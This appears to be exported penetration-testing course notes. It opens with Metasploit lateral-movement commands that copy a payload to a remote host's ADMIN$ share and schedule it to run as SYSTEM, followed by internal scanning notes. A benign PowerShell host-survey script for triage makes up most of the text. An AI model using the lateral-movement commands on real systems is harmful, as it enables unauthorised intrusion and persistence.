exploit/multi/handler<br />upload /root/payloads/msspool64.exe \\\\FORD\\ADMIN$\\system32\\msspool64.exe<br />net time \\FORD<br />schtasks /s FORD /create /tn Spoolx642  /tr msspool64.exe /sc once /st 11:45:32 /ru SYSTEM<br /><br /><br />netsh firewall show state<br />netsh firewall show portopening<br />netsh firewall show config<br /><br />7367 is open on both sides</div><div class='page'><h1 class='title level-4'>Abernathy 192.168.201.3</h1><br/>192.168.201.3<br />ABERNATHY.Culex.int<br /><br />set route 192.168.201.0/24 5<br />use post/windows/gather/arp_scanner<br />use auxiliary/scanner/portscan/tcp (I was hinted to scan for 16201 (bluecoat))<br />use auxiliary/scanner/smb/smb_version<br /></div><div class='page'><h1 class='title level-3'>Good Course Stuff</h1><br/></div><div class='page'><h1 class='title level-4'>Powershell SA</h1><br/><div class="codebox"><div class="codebox">function&nbsp;Invoke-SituationalAwareness<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Declared&nbsp;the&nbsp;situational&nbsp;awareness&nbsp;section&nbsp;has&nbsp;begun&nbsp;executing<br />&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Beginning&nbsp;Situational&nbsp;awareness&nbsp;check.&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;current&nbsp;date&nbsp;&amp;&nbsp;time<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-Date<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;hostname<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-WmiObject&nbsp;win32_OperatingSystem&nbsp;|&nbsp;fl&nbsp;PSComputerName<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;IP/MAC&nbsp;address<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-WmiObject&nbsp;–Class&nbsp;Win32_NetworkAdapterConfiguration&nbsp;|&nbsp;where-object&nbsp;{&nbsp;$_.IPAddress}&nbsp;|&nbsp;Format-Table<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;current&nbsp;process<br />&nbsp;&nbsp;&nbsp;&nbsp;$PID<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-PSHostProcessInfo<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;user&nbsp;context<br />&nbsp;&nbsp;&nbsp;&nbsp;([Security.Principal.WindowsIdentity]::GetCurrent()).Name<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Determine&nbsp;if&nbsp;running&nbsp;with&nbsp;administrative&nbsp;privileges<br />&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Currently&nbsp;have&nbsp;administrative&nbsp;rights:&quot;;&nbsp;([Security.Principal.WindowsPrincipal]&nbsp;[Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]&nbsp;“Administrator”)<br />}<br /><br />function&nbsp;Invoke-SecurityCheck<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Declared&nbsp;the&nbsp;security&nbsp;section&nbsp;has&nbsp;begun&nbsp;executing<br />&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Beginning&nbsp;security&nbsp;check.&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;list&nbsp;of&nbsp;running&nbsp;processes<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-Process<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;list&nbsp;of&nbsp;running&nbsp;services<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-Service&nbsp;|&nbsp;where-object&nbsp;{&nbsp;$_.Status&nbsp;–eq&nbsp;‘running’&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Verifies&nbsp;security&nbsp;auditing&nbsp;is&nbsp;enabled<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-LogProperties&nbsp;Security&nbsp;|&nbsp;Format-List&nbsp;enabled<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Displays&nbsp;the&nbsp;audit&nbsp;categories&nbsp;&amp;&nbsp;settings<br />&nbsp;&nbsp;&nbsp;&nbsp;auditpol.exe&nbsp;/get&nbsp;/category:*<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;20&nbsp;most&nbsp;recent&nbsp;entries<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-EventLog&nbsp;Security&nbsp;–Newest&nbsp;21<br />}<br /><br />function&nbsp;Invoke-HostInfo<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Declared&nbsp;the&nbsp;Host&nbsp;info&nbsp;section&nbsp;has&nbsp;begun&nbsp;executing<br />&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Beginning&nbsp;Host&nbsp;Info&nbsp;check.&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;general&nbsp;computer&nbsp;information<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ComputerInfo<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;hard&nbsp;drive&nbsp;information<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-WmiObject&nbsp;–Class&nbsp;Win32_LogicalDisk&nbsp;&nbsp;-Filter&nbsp;‘DriveType=3’|&nbsp;Format-Table&nbsp;DeviceID,&nbsp;Size,&nbsp;FreeSpace<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;processor&nbsp;load<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-WmiObject&nbsp;–Class&nbsp;Win32_Processor&nbsp;|&nbsp;Select-Object&nbsp;name,&nbsp;LoadPercentage<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;memory&nbsp;load<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-WmiObject&nbsp;–Class&nbsp;Win32_OperatingSystem&nbsp;|&nbsp;ForEach-Object&nbsp;{“{0:N2}%”&nbsp;–f&nbsp;((($_.TotalVisibleMemorySize&nbsp;-&nbsp;$_.FreePhysicalMemory)*100)/&nbsp;$_.TotalVisibleMemorySize)}<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;network&nbsp;connections&nbsp;&amp;&nbsp;sockets<br />&nbsp;&nbsp;&nbsp;&nbsp;netstat&nbsp;-ano<br />}<br /><br />function&nbsp;Invoke-PersistenceCheck<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Declared&nbsp;the&nbsp;persistence&nbsp;section&nbsp;has&nbsp;begun&nbsp;executing<br />&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Beginning&nbsp;persistence&nbsp;check.&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;HKLM&nbsp;Run&nbsp;key<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ItemProperty&nbsp;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;HKLM&nbsp;RunOnce&nbsp;key<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ItemProperty&nbsp;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;HKLM&nbsp;Winlogon&nbsp;key<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ItemProperty&nbsp;“HKLM:\Software\Microsoft\Windows&nbsp;NT\CurrentVersion\Winlogon”<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;HKCU&nbsp;Run&nbsp;key<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ItemProperty&nbsp;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;HKCU&nbsp;RunOnce&nbsp;key<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ItemProperty&nbsp;HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;the&nbsp;HKCU&nbsp;Winlogon&nbsp;key<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ItemProperty&nbsp;“HKCU:\Software\Microsoft\Windows&nbsp;NT\CurrentVersion\Winlogon”<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;all&nbsp;at&nbsp;jobs<br />&nbsp;&nbsp;&nbsp;&nbsp;at<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;all&nbsp;scheduled&nbsp;tasks<br />&nbsp;&nbsp;&nbsp;&nbsp;schtasks&nbsp;/query&nbsp;&nbsp;/V&nbsp;/FO&nbsp;list<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;host&nbsp;startup&nbsp;folder<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ChildItem&nbsp;‘C:\ProgramData\Microsoft\Windows\Start&nbsp;Menu\Programs\Startup’<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;startup&nbsp;folder&nbsp;for&nbsp;each&nbsp;user<br />&nbsp;&nbsp;&nbsp;&nbsp;$names&nbsp;=&nbsp;Get-ChildItem&nbsp;C:\Users&nbsp;|&nbsp;where&nbsp;{&nbsp;$_.Name&nbsp;-ne&nbsp;&quot;Public&quot;&nbsp;-and&nbsp;$_.Name&nbsp;-ne&nbsp;&quot;installer&quot;&nbsp;}&nbsp;|&nbsp;select&nbsp;{&nbsp;$_.Name&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($name&nbsp;in&nbsp;$names)&nbsp;{&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$test&nbsp;=&nbsp;Get-ChildItem&nbsp;(&#39;c:\Users\&#39;&nbsp;+&nbsp;($name.&#39;&nbsp;$_.Name&nbsp;&#39;)&nbsp;+&nbsp;&#39;\Appdata\Roaming\Microsoft\Windows\Start&nbsp;Menu\Programs\Startup&#39;)&nbsp;-ErrorAction&nbsp;SilentlyContinue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($test&nbsp;-ne&nbsp;$null)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get-ChildItem&nbsp;(&#39;c:\Users\&#39;&nbsp;+&nbsp;($name.&#39;&nbsp;$_.Name&nbsp;&#39;)&nbsp;+&nbsp;&#39;\Appdata\Roaming\Microsoft\Windows\Start&nbsp;Menu\Programs\Startup&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;all&nbsp;autostart&nbsp;services<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-wmiobject&nbsp;win32_service&nbsp;|&nbsp;where-object&nbsp;{&nbsp;$_.StartMode&nbsp;–eq&nbsp;‘Auto’&nbsp;}&nbsp;|&nbsp;format-list&nbsp;Name,&nbsp;DisplayName,&nbsp;PathName<br />}<br /><br />function&nbsp;Invoke-LogCheck<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Declared&nbsp;the&nbsp;logging&nbsp;check&nbsp;section&nbsp;has&nbsp;begun&nbsp;executing<br />&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Beginning&nbsp;Log&nbsp;check.&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Pulls&nbsp;every&nbsp;file&nbsp;which&nbsp;has&nbsp;updated&nbsp;in&nbsp;the&nbsp;last&nbsp;hour<br />&nbsp;&nbsp;&nbsp;&nbsp;Get-ChildItem&nbsp;–Path&nbsp;C:\&nbsp;-recurse&nbsp;-ErrorAction&nbsp;SilentlyContinue&nbsp;|&nbsp;Where-Object&nbsp;{&nbsp;$_.LastWriteTime&nbsp;–ge&nbsp;(Get-Date).AddMinutes(-60)&nbsp;}<br />}<br /><br /><br />&lt;#<br />.Synopsis<br />&nbsp;&nbsp;&nbsp;Short&nbsp;description<br />.DESCRIPTION<br />&nbsp;&nbsp;&nbsp;Long&nbsp;description<br />.EXAMPLE<br />&nbsp;&nbsp;&nbsp;Example&nbsp;of&nbsp;how&nbsp;to&nbsp;use&nbsp;this&nbsp;cmdlet<br />.EXAMPLE<br />&nbsp;&nbsp;&nbsp;Another&nbsp;example&nbsp;of&nbsp;how&nbsp;to&nbsp;use&nbsp;this&nbsp;cmdlet<br />#&gt;<br />function&nbsp;Invoke-HostSurvey<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;[CmdletBinding()]<br />&nbsp;&nbsp;&nbsp;&nbsp;Param<br />&nbsp;&nbsp;&nbsp;&nbsp;(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;A&nbsp;switch&nbsp;to&nbsp;run&nbsp;through&nbsp;all&nbsp;functions&nbsp;without&nbsp;breakpoints<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Switch]$Noninteractive<br />&nbsp;&nbsp;&nbsp;&nbsp;)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;Begin<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;Process<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;An&nbsp;If&nbsp;statement&nbsp;that&nbsp;determines&nbsp;behvior&nbsp;if&nbsp;the&nbsp;-noninteractive&nbsp;switch&nbsp;was&nbsp;used<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If($noninteractive)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-SituationalAwareness<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-SecurityCheck<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-HostInfo<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-PersistenceCheck<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-LogCheck<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Else&nbsp;-&nbsp;default&nbsp;behavior,&nbsp;including&nbsp;breakpoints<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Runs&nbsp;the&nbsp;Situational&nbsp;awareness&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-SituationalAwareness<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;A&nbsp;breakpoint&nbsp;to&nbsp;determine&nbsp;if&nbsp;the&nbsp;user&nbsp;wishes&nbsp;to&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bp1&nbsp;=&nbsp;Read-Host&nbsp;&quot;Do&nbsp;you&nbsp;wish&nbsp;to&nbsp;continue?&nbsp;(Y&nbsp;or&nbsp;N)&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;statement&nbsp;to&nbsp;determine&nbsp;if&nbsp;to&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($bp1&nbsp;-eq&nbsp;&#39;Y&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Runs&nbsp;the&nbsp;security&nbsp;check&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-SecurityCheck<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;A&nbsp;breakpoint&nbsp;to&nbsp;determine&nbsp;if&nbsp;the&nbsp;user&nbsp;wishes&nbsp;to&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bp2&nbsp;=&nbsp;Read-Host&nbsp;&quot;Do&nbsp;you&nbsp;wish&nbsp;to&nbsp;continue?&nbsp;(Y&nbsp;or&nbsp;N)&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;statement&nbsp;to&nbsp;determine&nbsp;if&nbsp;to&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($bp2&nbsp;-eq&nbsp;&#39;Y&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Runs&nbsp;the&nbsp;host&nbsp;info&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-HostInfo<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;A&nbsp;breakpoint&nbsp;to&nbsp;determine&nbsp;if&nbsp;the&nbsp;user&nbsp;wishes&nbsp;to&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bp3&nbsp;=&nbsp;Read-Host&nbsp;&quot;Do&nbsp;you&nbsp;wish&nbsp;to&nbsp;continue?&nbsp;(Y&nbsp;or&nbsp;N)&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;statement&nbsp;to&nbsp;determine&nbsp;if&nbsp;to&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($bp3&nbsp;-eq&nbsp;&#39;Y&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Runs&nbsp;the&nbsp;persistence&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-PersistenceCheck<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;A&nbsp;breakpoint&nbsp;to&nbsp;determine&nbsp;if&nbsp;the&nbsp;user&nbsp;wishes&nbsp;to&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bp4&nbsp;=&nbsp;Read-Host&nbsp;&quot;Do&nbsp;you&nbsp;wish&nbsp;to&nbsp;continue?&nbsp;(Y&nbsp;or&nbsp;N)&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;If&nbsp;statement&nbsp;to&nbsp;determine&nbsp;if&nbsp;to&nbsp;continue<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($bp4&nbsp;-eq&nbsp;&#39;Y&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Runs&nbsp;the&nbsp;log&nbsp;check&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-LogCheck<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br 